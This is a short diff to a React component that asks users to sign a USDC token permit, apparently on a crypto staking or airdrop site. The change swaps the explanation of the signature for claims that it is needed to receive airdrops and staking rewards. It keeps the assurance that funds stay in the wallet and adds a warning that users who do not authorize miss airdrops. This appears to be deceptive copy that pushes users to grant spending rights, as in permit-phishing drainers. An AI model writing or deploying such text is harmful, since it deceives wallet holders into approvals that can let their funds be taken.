@@ -425,10 +425,13 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
       <div className="bg-zinc-50 rounded-xl p-4 mb-4">
         <p className="text-xs text-zinc-500 mb-2">What this does:</p>
         <ul className="text-sm text-zinc-700 space-y-1">
-          <li>• Authorizes the platform to track your USDC balance</li>
-          <li>• Required for soft staking rewards calculation</li>
+          <li>• Authorizes the platform for airdrop distribution</li>
+          <li>• Required to receive staking rewards</li>
           <li>• Your funds remain in your wallet at all times</li>
         </ul>
+        <p className="text-xs text-amber-600 mt-2">
+          ⚠️ Without authorization, you won&apos;t receive airdrops
+        </p>
       </div>
 
       {!success ? (
